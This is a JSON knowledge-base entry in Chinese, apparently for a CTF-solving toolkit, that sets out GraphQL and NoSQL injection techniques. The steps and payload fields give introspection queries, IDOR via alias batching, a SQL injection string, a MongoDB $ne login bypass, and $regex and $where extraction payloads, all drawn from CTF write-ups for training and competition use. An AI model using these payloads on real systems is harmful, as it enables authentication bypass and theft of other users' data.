@@ -1,0 +1,58 @@
+{
+ "id": "web-graphql-nosql-injection",
+ "title": "GraphQL 攻击面(内省/IDOR/SQLi/嵌套)与 NoSQL 注入($ne/$gt 算子、MongoDB、graphene)",
+ "vuln_pattern": "GraphQL 端点暴露(/graphql):内省拿全 schema → 查询级越权(IDOR)/resolver 拼接 SQL/嵌套放大;后端为 MongoDB 时 NoSQL 算子注入($ne/$gt/$regex)绕过认证与过滤",
+ "fingerprint": [
+  "graphql",
+  "GraphQL",
+  "graphene",
+  "strawberry",
+  "apollo",
+  "introspection",
+  "内省",
+  "nosql",
+  "mongodb",
+  "$ne",
+  "$where",
+  "mongoose"
+ ],
+ "exploit_steps": [
+  "第一步永远是内省:POST /graphql {\"query\":\"{__schema{types{name fields{name type{name}}}}}\"} 拿全类型/字段;被禁时用字段级报错探测(suggest 类型)、clairvoyance 字典猜 schema,或找 /graphql?query= 的 GET 缓存/日志副本。",
+  "按 schema 找越权字段:query(user(id:2){secretField}) 形态的 IDOR 是 GraphQL 题最高频解;mutation 里找 isAdmin/createUser 之类未鉴权可调的;别名批量(alias)一次请求枚举连续 id。",
+  "resolver SQL 注入:参数直拼的 query 参数(id、search)注入 ' 或 1=1-- -;盲注用布尔差异(alias 两个查询对比响应)。strawberry/graphene 都常见 f-string 拼 SQL 的 resolver。",
+  "NoSQL(MongoDB/graphene-mongo):登录/查询参数传 {\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}} 或 GraphQL 变量里传对象类型;字符串比较绕过用 $regex(逐字符二分拖数据);$where 注入 JS 表达式(返回布尔)。",
+  "嵌套/批量攻击:深度嵌套查询 DoS 别碰(无益解题);但 alias 批量 + fragments 可一次拿多行越权数据,速率友好。",
+  "工具:用 curl 裸发 JSON 即可(不需要 graphiql);schema 拿到后本地 jq 解析字段清单;更多 payload 语料 grep /opt/kb INDEX: PayloadsAllTheThings/GraphQL Injection。"
+ ],
+ "key_payloads": [
+  "# 内省\n{\"query\":\"{__schema{queryType{name} types{name fields{name type{name}}}}}\"}\n# IDOR via alias 批量\n{\"query\":\"{a:user(id:1){email flag} b:user(id:2){email flag}}\"}\n# NoSQL 登录绕过(变量对象注入)\n{\"query\":\"mutation login($u:JsonObject,$p:JsonObject){login(u:$u,p:$p)}\",\"variables\":{\"u\":{\"$ne\":\"x\"},\"p\":{\"$ne\":\"x\"}}}",
+  "# $regex 盲拖(MongoDB)\n{\"username\":{\"$regex\":\"^admin\"},\"password\":{\"$regex\":\"^f\"}}   # 逐字符二分\n# $where JS 注入\n{\"$where\":\"this.password.charAt(0)=='f'\"}"
+ ],
+ "category": "web",
+ "cve": [],
+ "tags": [
+  "graphql",
+  "introspection",
+  "idor",
+  "nosql-injection",
+  "mongodb",
+  "operator-injection",
+  "graphene",
+  "strawberry"
+ ],
+ "source": "writeup 提炼(CTF 实战实例分析)",
+ "source_tier": "seed",
+ "preconditions": [
+  "暴露 /graphql 或类似端点(graphene/strawberry/apollo 特征)",
+  "或后端存储为 MongoDB 且查询参数可传对象/算子"
+ ],
+ "verify_oracle": "内省响应列出敏感字段;越权查询返回他人 email/flag 字段;NoSQL 绕过登录拿到会话",
+ "pitfalls": [
+  "内省被禁就放弃——字段建议报错和字典猜仍能恢复大部分 schema",
+  "GraphQL 变量传对象必须用变量($var)而非内联字符串,内联串就是字符串",
+  "alias 深度别超限(服务端常见 depth limit 10)——分批",
+  "NoSQL 算子要后端真的把参数当查询对象用;类型严格的 resolver 传字符串即可,先小探针定型"
+ ],
+ "anti_fingerprint": [],
+ "created_ts": 0.0
+}
